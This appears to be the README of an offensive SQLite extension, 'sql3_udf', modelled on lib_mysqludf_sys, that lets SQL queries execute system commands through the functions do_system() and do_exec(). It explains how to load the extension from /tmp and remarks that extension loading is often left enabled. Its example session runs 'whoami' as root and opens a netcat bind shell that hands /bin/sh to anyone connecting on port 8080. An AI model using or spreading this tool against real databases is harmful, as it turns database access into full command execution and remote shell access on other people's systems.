sql3_udf
========

Much like lib_mysqludf_sys, this is a UDF (run-time loadable extension in 
sqlite land) library used to execute system commands from SQL queries.
It can be loaded through the SQLite3 interface or using a query:

```
sqlite> select load_extension("/tmp/lib_sql3udf_sys.sqlext");
```
or
```
sqlite .load /tmp/sql3_udf.sqlext
```

Please note that, by default, the load_extension functionality is disabled by 
default.  Many sqlite3 databases, however, do enable it, so all is not lost.  This
can be enabled in source code with the following:

``` 
sqlite3_enable_load_extension(db, 1);
```

Two functions are exposed through this simple interface:

``` 
do_system()
    -- Executes a system command and returns only the status of that execution.
do_exec()
    -- Executes a system command and returns all of the resulting output.
```

Thus:
```
$ sqlite3 test.db
sqlite> .load /tmp/sql3_udf.sqlext
sqlite> select do_exec('whoami');
root
sqlite> select do_system("nc -lv -p 8080 -e /bin/sh &>/dev/null &");
0
sqlite>
```
